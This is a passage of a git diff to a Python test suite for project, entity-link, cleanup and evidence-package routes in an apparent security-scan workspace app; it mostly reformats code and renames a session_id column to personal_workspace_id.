         assert auto_promote_log["rule_results_truncated"] is False
-        assert auto_promote_log["rule_results"] == [{
-            "project_id": project["id"],
-            "rule_id": enabled.get_json()["rule"]["id"],
-            "matched_count": 1,
-            "linked_count": 1,
-            "promoted_count": 1,
-            "quota_limited_count": 0,
-            "match_cap_limited_count": 0,
-        }]
+        assert auto_promote_log["rule_results"] == [
+            {
+                "project_id": project["id"],
+                "rule_id": enabled.get_json()["rule"]["id"],
+                "matched_count": 1,
+                "linked_count": 1,
+                "promoted_count": 1,
+                "quota_limited_count": 0,
+                "match_cap_limited_count": 0,
+            }
+        ]
         assert "Finalize domains" not in json.dumps(auto_promote_log)
         assert "darklab.sh" not in json.dumps(auto_promote_log)
         with db_connect() as conn:
@@ -10887,8 +11021,7 @@ class TestProjectRoutes:
                 (project["id"],),
             ).fetchall()
             run_link = conn.execute(
-                "SELECT source FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
+                "SELECT source FROM project_links WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                 (project["id"], run_id),
             ).fetchone()
         assert [(row["type"], row["source"]) for row in rows] == [
@@ -10945,15 +11078,19 @@ class TestProjectRoutes:
         team_run_id = "run-auto-promote-team-finalize-" + uuid.uuid4().hex
 
         class TeamCapture:
-            preview_lines = [{
-                "text": "team-auto.example",
-                "cls": "",
-                "entities": [{
-                    "type": "domain",
-                    "value": "team-auto.example",
-                    "canonical_value": "team-auto.example",
-                }],
-            }]
+            preview_lines = [
+                {
+                    "text": "team-auto.example",
+                    "cls": "",
+                    "entities": [
+                        {
+                            "type": "domain",
+                            "value": "team-auto.example",
+                            "canonical_value": "team-auto.example",
+                        }
+                    ],
+                }
+            ]
             preview_truncated = False
             output_line_count = 1
             full_output_available = False
@@ -10978,9 +11115,7 @@ class TestProjectRoutes:
             )
 
         team_auto_promote_log = next(
-            call.kwargs["extra"]
-            for call in team_info_log.call_args_list
-            if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
+            call.kwargs["extra"] for call in team_info_log.call_args_list if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
         )
         assert team_auto_promote_log["team_id"] == team_id
         assert team_auto_promote_log["project_ids"] == [team_project["id"]]
@@ -11013,11 +11148,13 @@ class TestProjectRoutes:
         run_id = "run-auto-promote-nonfatal-" + uuid.uuid4().hex
 
         class FakeCapture:
-            preview_lines = [{
-                "text": "nonfatal.example",
-                "cls": "",
-                "entities": [{"type": "domain", "value": "nonfatal.example", "canonical_value": "nonfatal.example"}],
-            }]
+            preview_lines = [
+                {
+                    "text": "nonfatal.example",
+                    "cls": "",
+                    "entities": [{"type": "domain", "value": "nonfatal.example", "canonical_value": "nonfatal.example"}],
+                }
+            ]
             preview_truncated = False
             output_line_count = 1
             full_output_available = False
@@ -11048,7 +11185,7 @@ class TestProjectRoutes:
         with db_connect() as conn:
             run = conn.execute("SELECT id FROM runs WHERE id = ?", (run_id,)).fetchone()
             entity_count = conn.execute(
-                "SELECT COUNT(*) AS count FROM entities WHERE session_id = ?",
+                "SELECT COUNT(*) AS count FROM entities WHERE personal_workspace_id = ?",
                 (session_id,),
             ).fetchone()["count"]
         assert run is not None
@@ -11061,12 +11198,19 @@ class TestProjectRoutes:
         run_id = self._seed_run(session_id, "nmap darklab.sh")
         recorded = self._seed_run_entities(session_id, run_id)
         with db_connect() as conn:
-            record_run_findings(conn, session_id, run_id, [{
-                "text": "443/tcp open https on darklab.sh",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
-            }])
+            record_run_findings(
+                conn,
+                session_id,
+                run_id,
+                [
+                    {
+                        "text": "443/tcp open https on darklab.sh",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
+                    }
+                ],
+            )
             conn.commit()
         removable_id = recorded[0]["id"]
         curated_entity = recorded[1]
@@ -11084,7 +11228,7 @@ class TestProjectRoutes:
         )
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'keep', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, curated_id),
             )
@@ -11129,8 +11273,7 @@ class TestProjectRoutes:
             "not_eligible": {"entities": 0, "findings": 0, "total": 0},
         }
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in cleanup_reasons["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in cleanup_reasons["reasons"]
         }
         assert reason_counts[("default_project_link", "disposable")] == (1, 0)
         assert reason_counts[("entity_label", "kept_by_default")] == (1, 0)
@@ -11138,13 +11281,15 @@ class TestProjectRoutes:
         assert cleanup_reasons["samples"] == {
             "kept_by_default": {
                 "entities": {
-                    "items": [{
-                        "bucket": "kept_by_default",
-                        "kind": "entities",
-                        "display_value": curated_entity["canonical_value"],
-                        "item_type": curated_entity["type"],
-                        "reasons": [{"code": "entity_label", "label": "labeled"}],
-                    }],
+                    "items": [
+                        {
+                            "bucket": "kept_by_default",
+                            "kind": "entities",
+                            "display_value": curated_entity["canonical_value"],
+                            "item_type": curated_entity["type"],
+                            "reasons": [{"code": "entity_label", "label": "labeled"}],
+                        }
+                    ],
                     "omitted": 0,
                 },
             },
@@ -11153,9 +11298,7 @@ class TestProjectRoutes:
         unlink_data = json.loads(unlink_resp.data)
         assert unlink_data["unlinked_entities"]["removed"] == 1
         assert unlink_data["unlinked_entities"]["kept_curated"] == 1
-        unlink_log_call = next(
-            call for call in mock_unlink_info.call_args_list if call.args[0] == "PROJECT_LINK_REMOVED"
-        )
+        unlink_log_call = next(call for call in mock_unlink_info.call_args_list if call.args[0] == "PROJECT_LINK_REMOVED")
         cleanup_log_fields = {
             "include_entities_requested": True,
             "include_curated_entities_requested": False,
@@ -11176,15 +11319,13 @@ class TestProjectRoutes:
             assert project_unlink_audit["details"][key] == value
         with db_connect() as conn:
             run_link_count = conn.execute(
-                "SELECT COUNT(*) AS count FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
+                "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                 (project["id"], run_id),
             ).fetchone()["count"]
             remaining_entity_links = {
                 row["entity_id"]
                 for row in conn.execute(
-                    "SELECT entity_id FROM project_links "
-                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                    "SELECT entity_id FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                     (project["id"],),
                 ).fetchall()
             }
@@ -11200,21 +11341,30 @@ class TestProjectRoutes:
                 conn,
                 session_id,
                 auto_target_run_id,
-                [{
-                    "text": f"{auto_target_domain} 192.0.2.55",
-                    "entities": [
-                        {"type": "domain", "value": auto_target_domain, "canonical_value": auto_target_domain},
-                        {"type": "ip", "value": "192.0.2.55", "canonical_value": "192.0.2.55"},
-                    ],
-                }],
+                [
+                    {
+                        "text": f"{auto_target_domain} 192.0.2.55",
+                        "entities": [
+                            {"type": "domain", "value": auto_target_domain, "canonical_value": auto_target_domain},
+                            {"type": "ip", "value": "192.0.2.55", "canonical_value": "192.0.2.55"},
+                        ],
+                    }
+                ],
                 seen_at="2026-05-14T00:10:01+00:00",
             )
-            record_run_findings(conn, session_id, auto_target_run_id, [{
-                "text": f"443/tcp open https on {auto_target_domain}",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": auto_target_domain, "canonical_value": auto_target_domain}],
-            }])
+            record_run_findings(
+                conn,
+                session_id,
+                auto_target_run_id,
+                [
+                    {
+                        "text": f"443/tcp open https on {auto_target_domain}",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": auto_target_domain, "canonical_value": auto_target_domain}],
+                    }
+                ],
+            )
             conn.commit()
         auto_target_domain_id = next(item["id"] for item in auto_target_recorded if item["type"] == "domain")
         auto_target_link_resp = client.post(
@@ -11232,12 +11382,14 @@ class TestProjectRoutes:
                 "UPDATE project_links SET source = 'auto_command', review_state = 'pending', source_detail = ? "
                 "WHERE project_id = ? AND entity_type = 'atlas_entity' AND entity_id = ?",
                 (
-                    json.dumps({
-                        "kind": "positional",
-                        "name": "argument_1",
-                        "project_target": True,
-                        "value_type": "target",
-                    }),
+                    json.dumps(
+                        {
+                            "kind": "positional",
+                            "name": "argument_1",
+                            "project_target": True,
+                            "value_type": "target",
+                        }
+                    ),
                     auto_target_project["id"],
                     auto_target_domain_id,
                 ),
@@ -11267,8 +11419,7 @@ class TestProjectRoutes:
             "run_count": 1,
         }
         auto_target_reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in auto_target_reasons["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in auto_target_reasons["reasons"]
         }
         assert auto_target_reasons["buckets"]["disposable"] == {"entities": 2, "findings": 1, "total": 3}
         assert auto_target_reason_counts[("default_project_link", "disposable")] == (1, 0)
@@ -11283,13 +11434,15 @@ class TestProjectRoutes:
                 conn,
                 session_id,
                 custom_run_id,
-                [{
-                    "text": f"{custom_domain} 192.0.2.56",
-                    "entities": [
-                        {"type": "domain", "value": custom_domain, "canonical_value": custom_domain},
-                        {"type": "ip", "value": "192.0.2.56", "canonical_value": "192.0.2.56"},
-                    ],
-                }],
+                [
+                    {
+                        "text": f"{custom_domain} 192.0.2.56",
+                        "entities": [
+                            {"type": "domain", "value": custom_domain, "canonical_value": custom_domain},
+                            {"type": "ip", "value": "192.0.2.56", "canonical_value": "192.0.2.56"},
+                        ],
+                    }
+                ],
                 seen_at="2026-05-14T00:20:01+00:00",
             )
             conn.commit()
@@ -11317,7 +11470,7 @@ class TestProjectRoutes:
                 ("link-other-" + uuid.uuid4().hex, other_project["id"], custom_ip_id),
             )
             conn.execute(
-                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
+                "INSERT INTO entity_notes (id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'keep context', datetime('now'), datetime('now'))",
                 ("note-" + uuid.uuid4().hex, session_id, custom_domain_id),
             )
@@ -11336,8 +11489,7 @@ class TestProjectRoutes:
         assert custom_preview["curated"] == 2
         assert custom_reasons["buckets"]["kept_by_default"] == {"entities": 2, "findings": 0, "total": 2}
         custom_reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in custom_reasons["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in custom_reasons["reasons"]
         }
         assert custom_reason_counts[("custom_project_link", "kept_by_default")] == (1, 0)
         assert custom_reason_counts[("entity_note", "kept_by_default")] == (1, 0)
@@ -11348,12 +11500,19 @@ class TestProjectRoutes:
         curated_recorded = self._seed_run_entities(session_id, curated_run_id)
         curated_entity_id = curated_recorded[1]["id"]
         with db_connect() as conn:
-            record_run_findings(conn, session_id, curated_run_id, [{
-                "text": "443/tcp open https on darklab.sh",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
-            }])
+            record_run_findings(
+                conn,
+                session_id,
+                curated_run_id,
+                [
+                    {
+                        "text": "443/tcp open https on darklab.sh",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
+                    }
+                ],
+            )
             conn.commit()
         client.post(
             f"/projects/{curated_project['id']}/links",
@@ -11367,7 +11526,7 @@ class TestProjectRoutes:
         )
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'keep-curated', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, curated_entity_id),
             )
@@ -11390,8 +11549,7 @@ class TestProjectRoutes:
         assert curated_unlink_data["unlinked_entities"]["kept_curated"] == 0
         with db_connect() as conn:
             remaining_curated_links = conn.execute(
-                "SELECT COUNT(*) AS count FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                 (curated_project["id"],),
             ).fetchone()["count"]
         assert remaining_curated_links == 0
@@ -11409,12 +11567,20 @@ class TestProjectRoutes:
         run_id = self._seed_run(owner_token, "nmap team-unlink.darklab.sh", team_id=team_id)
         self._seed_run_entities(owner_token, run_id, team_id=team_id)
         with db_connect() as conn:
-            record_run_findings(conn, owner_token, run_id, [{
-                "text": "443/tcp open https on darklab.sh",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
-            }], team_id=team_id)
+            record_run_findings(
+                conn,
+                owner_token,
+                run_id,
+                [
+                    {
+                        "text": "443/tcp open https on darklab.sh",
+                        "signals": ["findings"],
+                        "line_index": 0,
+                        "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
+                    }
+                ],
+                team_id=team_id,
+            )
             conn.commit()
         link_resp = client.post(
             f"/projects/{project['id']}/links",
@@ -11460,8 +11626,7 @@ class TestProjectRoutes:
         }
         assert cleanup_reasons["buckets"]["disposable"] == {"entities": 2, "findings": 1, "total": 3}
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in cleanup_reasons["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in cleanup_reasons["reasons"]
         }
         assert reason_counts[("default_project_link", "disposable")] == (2, 0)
         assert reason_counts[("finding_attached_to_removed_entity", "disposable")] == (0, 1)
@@ -11470,8 +11635,7 @@ class TestProjectRoutes:
         assert unlink_data["unlinked_entities"]["removed"] == 2
         with db_connect() as conn:
             remaining_entity_links = conn.execute(
-                "SELECT COUNT(*) AS count FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                 (project["id"],),
             ).fetchone()["count"]
         assert remaining_entity_links == 0
@@ -11494,13 +11658,13 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, team_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, 'external', 'nmap unlink-child.darklab.sh', ?, '[]', 1)",
                 (run_id, operator_token, team_id, seen_at),
             )
             conn.execute(
                 "INSERT INTO entities "
-                "(id, session_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
+                "(id, personal_workspace_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                 "occurrence_count, created) "
                 "VALUES (?, ?, ?, 'domain', 'unlink-child.darklab.sh', ?, ?, ?, 1, ?)",
                 (entity_id, owner_token, team_id, "sig-" + entity_id, seen_at, seen_at, seen_at),
@@ -11512,7 +11676,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                "(id, personal_workspace_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                 "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, review_state, "
                 "title, raw_line, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, 'info', 'finding', 'nmap', ?, ?, ?, ?, 1, 'new', 'reviewed', ?, ?, ?)",
@@ -11580,35 +11744,42 @@ class TestProjectRoutes:
             "total": 2,
         }
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert reason_counts[("finding_attached_to_kept_entity", "kept_by_default")] == (1, 1)
         assert preview["cleanup_reasons"]["samples"] == {
             "kept_by_default": {
                 "entities": {
-                    "items": [{
-                        "bucket": "kept_by_default",
-                        "kind": "entities",
-                        "display_value": "unlink-child.darklab.sh",
-                        "item_type": "domain",
-                        "reasons": [{
-                            "code": "finding_attached_to_kept_entity",
-                            "label": "attached to kept entity",
-                        }],
-                    }],
+                    "items": [
+                        {
+                            "bucket": "kept_by_default",
+                            "kind": "entities",
+                            "display_value": "unlink-child.darklab.sh",
+                            "item_type": "domain",
+                            "reasons": [
+                                {
+                                    "code": "finding_attached_to_kept_entity",
+                                    "label": "attached to kept entity",
+                                }
+                            ],
+                        }
+                    ],
                     "omitted": 0,
                 },
                 "findings": {
-                    "items": [{
-                        "bucket": "kept_by_default",
-                        "kind": "findings",
-                        "display_value": "443/tcp open https on unlink-child.darklab.sh",
-                        "reasons": [{
-                            "code": "finding_attached_to_kept_entity",
-                            "label": "attached to kept entity",
-                        }],
-                    }],
+                    "items": [
+                        {
+                            "bucket": "kept_by_default",
+                            "kind": "findings",
+                            "display_value": "443/tcp open https on unlink-child.darklab.sh",
+                            "reasons": [
+                                {
+                                    "code": "finding_attached_to_kept_entity",
+                                    "label": "attached to kept entity",
+                                }
+                            ],
+                        }
+                    ],
                     "omitted": 0,
                 },
             },
@@ -11624,8 +11795,7 @@ class TestProjectRoutes:
                 (project["id"], entity_id),
             ).fetchone()["count"]
             remaining_run_links = conn.execute(
-                "SELECT COUNT(*) AS count FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
+                "SELECT COUNT(*) AS count FROM project_links WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                 (project["id"], run_id),
             ).fetchone()["count"]
         assert remaining_entity_links == 1
@@ -11689,11 +11859,15 @@ class TestProjectRoutes:
     def test_project_target_quota_ignores_bulk_linked_atlas_entities(self):
         client = get_client()
         session_id = self._session_id("project-target-quota")
-        with mock.patch.dict(shell_app_module.CFG, {
-            "max_project_links_per_project": 20,
-            "max_project_entities_per_project": 20,
-            "max_project_targets_per_project": 1,
-        }, clear=False):
+        with mock.patch.dict(
+            shell_app_module.CFG,
+            {
+                "max_project_links_per_project": 20,
+                "max_project_entities_per_project": 20,
+                "max_project_targets_per_project": 1,
+            },
+            clear=False,
+        ):
             project = self._create_project(client, session_id)
             run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
             recorded = self._seed_run_entities(session_id, run_id)
@@ -11725,11 +11899,15 @@ class TestProjectRoutes:
     def test_bulk_project_atlas_links_obey_entity_quota(self):
         client = get_client()
         session_id = self._session_id("project-entity-quota")
-        with mock.patch.dict(shell_app_module.CFG, {
-            "max_project_links_per_project": 20,
-            "max_project_entities_per_project": 1,
-            "max_project_targets_per_project": 20,
-        }, clear=False):
+        with mock.patch.dict(
+            shell_app_module.CFG,
+            {
+                "max_project_links_per_project": 20,
+                "max_project_entities_per_project": 1,
+                "max_project_targets_per_project": 20,
+            },
+            clear=False,
+        ):
             project = self._create_project(client, session_id)
             run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
             recorded = self._seed_run_entities(session_id, run_id)
@@ -11772,20 +11950,22 @@ class TestProjectRoutes:
             artifact_path.write_bytes(artifact_body)
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                 (
                     run_id,
                     session_id,
                     "curl https://secret.darklab.sh -H 'Authorization: Bearer abc123'",
-                    json.dumps([
-                        {"text": "Authorization: Bearer abc123", "cls": "", "line_index": 0},
-                        {
-                            "text": "https://secret.darklab.sh responded from 192.168.1.5",
-                            "cls": "",
-                            "line_index": 1,
-                        },
-                    ]),
+                    json.dumps(
+                        [
+                            {"text": "Authorization: Bearer abc123", "cls": "", "line_index": 0},
+                            {
+                                "text": "https://secret.darklab.sh responded from 192.168.1.5",
+                                "cls": "",
+                                "line_index": 1,
+                            },
+                        ]
+                    ),
                     2,
                 ),
             )
@@ -11796,7 +11976,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'token leak', ?, 0, ?, datetime('now'))",
                 (
                     f"fnd_{run_id}",
@@ -11808,7 +11988,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                 "content_type, preview_type, content_sha256, created) "
                 "VALUES (?, ?, ?, 'reports/secrets.txt', 'secrets.txt', 'output', ?, "
                 "'workspace_flag', 'text/plain', 'text', ?, datetime('now'))",
@@ -11821,7 +12001,7 @@ class TestProjectRoutes:
             ):
                 conn.execute(
                     "INSERT INTO entity_notes "
-                    "(id, session_id, entity_type, entity_id, body, created, updated) "
+                    "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                     "VALUES (?, ?, ?, ?, ?, datetime('now'), datetime('now'))",
                     (note_id, session_id, entity_type, entity_id, body),
                 )
@@ -11849,7 +12029,7 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'target', ?, 'Target private note should stay out', datetime('now'), datetime('now'))",
                 (f"note_tgt_{run_id}", session_id, target_id),
             )
@@ -11975,25 +12155,31 @@ class TestProjectRoutes:
     def test_project_workspace_write_quotas_return_conflict(self):
         client = get_client()
         session_id = self._session_id("project-quota")
-        with mock.patch.dict(shell_app_module.CFG, {
-            "max_projects_per_session": 5,
-            "max_project_links_per_project": 1,
-            "max_project_targets_per_project": 1,
-            "max_evidence_packages_per_project": 1,
-            "max_entity_labels_per_session": 5,
-            "max_entity_labels_per_entity": 1,
-            "max_entity_notes_per_session": 5,
-        }, clear=False):
+        with mock.patch.dict(
+            shell_app_module.CFG,
+            {
+                "max_projects_per_session": 5,
+                "max_project_links_per_project": 1,
+                "max_project_targets_per_project": 1,
+                "max_evidence_packages_per_project": 1,
+                "max_entity_labels_per_session": 5,
+                "max_entity_labels_per_entity": 1,
+                "max_entity_notes_per_session": 5,
+            },
+            clear=False,
+        ):
             project = self._create_project(client, session_id)
             first_run_id = "run-" + uuid.uuid4().hex
             second_run_id = "run-" + uuid.uuid4().hex
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'dig darklab.sh', datetime('now'))",
+                    "INSERT INTO runs (id, personal_workspace_id, command, started) "
+                    "VALUES (?, ?, 'dig darklab.sh', datetime('now'))",
                     (first_run_id, session_id),
                 )
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'whois darklab.sh', datetime('now'))",
+                    "INSERT INTO runs (id, personal_workspace_id, command, started) "
+                    "VALUES (?, ?, 'whois darklab.sh', datetime('now'))",
                     (second_run_id, session_id),
                 )
                 conn.commit()
@@ -12081,17 +12267,22 @@ class TestProjectRoutes:
         session_id = self._session_id("project-package-size")
         project = self._create_project(client, session_id)
         run_id = "run-" + uuid.uuid4().hex
-        with mock.patch.dict(shell_app_module.CFG, {
-            "workspace_enabled": True,
-            "workspace_root": str(tmp_path / "workspaces"),
-            "evidence_package_max_mb": 1,
-            "evidence_package_max_uncompressed_mb": 5,
-        }, clear=False):
+        with mock.patch.dict(
+            shell_app_module.CFG,
+            {
+                "workspace_enabled": True,
+                "workspace_root": str(tmp_path / "workspaces"),
+                "evidence_package_max_mb": 1,
+                "evidence_package_max_uncompressed_mb": 5,
+            },
+            clear=False,
+        ):
             artifact_path = resolve_workspace_path(session_id, "reports/big.txt", shell_app_module.CFG, ensure_parent=True)
             artifact_path.write_bytes(os.urandom(1024 * 1024 + 1))
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/big.txt', datetime('now'))",
+                    "INSERT INTO runs (id, personal_workspace_id, command, started) "
+                    "VALUES (?, ?, 'cat reports/big.txt', datetime('now'))",
                     (run_id, session_id),
                 )
                 conn.execute(
@@ -12101,16 +12292,18 @@ class TestProjectRoutes:
                 )
                 conn.execute(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                     "VALUES (?, ?, ?, 'reports/big.txt', 'big.txt', 'output', ?, 'workspace_flag', datetime('now'))",
                     ("rfa_" + uuid.uuid4().hex[:16], session_id, run_id, artifact_path.stat().st_size),
                 )
                 conn.commit()
-            package = json.loads(client.post(
-                f"/projects/{project['id']}/packages",
-                json={"name": "Oversize", "include_artifacts": True},
-                headers={"X-Session-ID": session_id},
-            ).data)["package"]
+            package = json.loads(
+                client.post(
+                    f"/projects/{project['id']}/packages",
+                    json={"name": "Oversize", "include_artifacts": True},
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )["package"]
             resp = client.get(
                 f"/projects/{project['id']}/packages/{package['id']}/download",
                 headers={"X-Session-ID": session_id},
@@ -12124,20 +12317,22 @@ class TestProjectRoutes:
         project = self._create_project(client, session_id)
         run_id = self._seed_run(session_id, "nuclei -u https://darklab.sh")
         self._link_run(client, session_id, project["id"], run_id)
-        package = json.loads(client.post(
-            f"/projects/{project['id']}/packages",
-            json={
-                "name": "Async Evidence",
-                "selection": {
-                    "run_ids": [run_id],
-                    "transcript_run_ids": [run_id],
-                    "finding_ids": [],
-                    "artifact_ids": [],
-                    "target_ids": [],
+        package = json.loads(
+            client.post(
+                f"/projects/{project['id']}/packages",
+                json={
+                    "name": "Async Evidence",
+                    "selection": {
+                        "run_ids": [run_id],
+                        "transcript_run_ids": [run_id],
+                        "finding_ids": [],
+                        "artifact_ids": [],
+                        "target_ids": [],
+                    },
                 },
-            },
-            headers={"X-Session-ID": session_id},
-        ).data)["package"]
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["package"]
 
         job_resp = client.post(
             f"/projects/{project['id']}/packages/{package['id']}/download-jobs",
@@ -12158,7 +12353,8 @@ class TestProjectRoutes:
         assert job["status"] == "complete"
         assert job["archive_bytes"] > 0
         package_audit_rows = [
-            row for row in _audit_event_rows(target_id=package["id"], event_type="package.build")
+            row
+            for row in _audit_event_rows(target_id=package["id"], event_type="package.build")
             if row["details"].get("job_id") == job["id"]
         ]
         assert [row["details"]["status"] for row in package_audit_rows] == ["queued", "complete"]
@@ -12406,18 +12602,9 @@ class TestProjectRoutes:
         assert job["metrics"]["run_total"] == 0
         assert job["metrics"]["selection_modes"]["run_ids"] == "all"
         assert job["metrics"]["selection_excluded_counts"]["run_ids"] == 0
-        complete_call = next(
-            call for call in export_info.call_args_list
-            if call.args == ("REPORT_EXPORT_JOB_COMPLETE",)
-        )
-        queued_call = next(
-            call for call in export_info.call_args_list
-            if call.args == ("REPORT_EXPORT_JOB_QUEUED",)
-        )
-        started_call = next(
-            call for call in export_info.call_args_list
-            if call.args == ("REPORT_EXPORT_JOB_STARTED",)
-        )
+        complete_call = next(call for call in export_info.call_args_list if call.args == ("REPORT_EXPORT_JOB_COMPLETE",))
+        queued_call = next(call for call in export_info.call_args_list if call.args == ("REPORT_EXPORT_JOB_QUEUED",))
+        started_call = next(call for call in export_info.call_args_list if call.args == ("REPORT_EXPORT_JOB_STARTED",))
         queued_extra = queued_call.kwargs["extra"]
         started_extra = started_call.kwargs["extra"]
         assert queued_extra["job_id"] == job["id"]
@@ -12486,11 +12673,13 @@ class TestProjectRoutes:
             assert "Report assessment context" in report_md
             assert "Assessment coverage" in report_html
             _assert_no_audit_private_export_strings(
-                "\n".join([
-                    json.dumps(manifest),
-                    report_md,
-                    report_html,
-                ])
+                "\n".join(
+                    [
+                        json.dumps(manifest),
+                        report_md,
+                        report_html,
+                    ]
+                )
             )
         download_resp.close()
 
@@ -12511,11 +12700,13 @@ class TestProjectRoutes:
                     direct_report_html = archive.read("report.html").decode("utf-8")
                 assert "audit" not in direct_manifest["provenance"]
                 _assert_no_audit_private_export_strings(
-                    "\n".join([
-                        json.dumps(direct_manifest),
-                        direct_report_md,
-                        direct_report_html,
-                    ])
+                    "\n".join(
+                        [
+                            json.dumps(direct_manifest),
+                            direct_report_md,
+                            direct_report_html,
+                        ]
+                    )
                 )
             finally:
                 try:
@@ -12630,51 +12821,56 @@ class TestProjectRoutes:
             if index == 504:
                 selected_run_id = run_id
             started = (base_started - timedelta(seconds=index)).isoformat()
-            run_rows.append((
-                run_id,
-                session_id,
-                "external",
-                "",
-                f"echo report page run {index:03d}",
-                started,
-                "[]",
-                0,
-            ))
-            link_rows.append((
-                f"pln_report_page_{fixture_suffix}_{index:03d}",
-                project["id"],
-                "run",
-                run_id,
-                "manual",
-                started,
-            ))
-            if index in {0, 10, 504}:
-                finding_rows.append((
